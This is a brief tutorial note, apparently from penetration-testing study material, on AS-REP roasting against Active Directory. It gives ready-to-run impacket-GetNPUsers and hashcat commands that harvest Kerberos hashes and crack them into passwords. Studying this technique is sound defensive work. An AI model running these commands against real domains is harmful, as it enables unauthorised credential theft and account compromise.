Using impacket-GetNPUsers

impacket-GetNPUsers identifies Active Directory accounts with Kerberos pre-authentication disabled and requests AS-REP messages from the Domain Controller. The returned Kerberos data can be cracked offline to recover user passwords.

Advantages

Does not require valid credentials when allowed, supports offline password cracking, and generates minimal network traffic.

Disadvantages

Requires Kerberos pre-authentication to be disabled and can still be detected.

Use Authenticated User To Perform AS-REP Roasting

impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete

Crack Session Key Use Hashcat

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
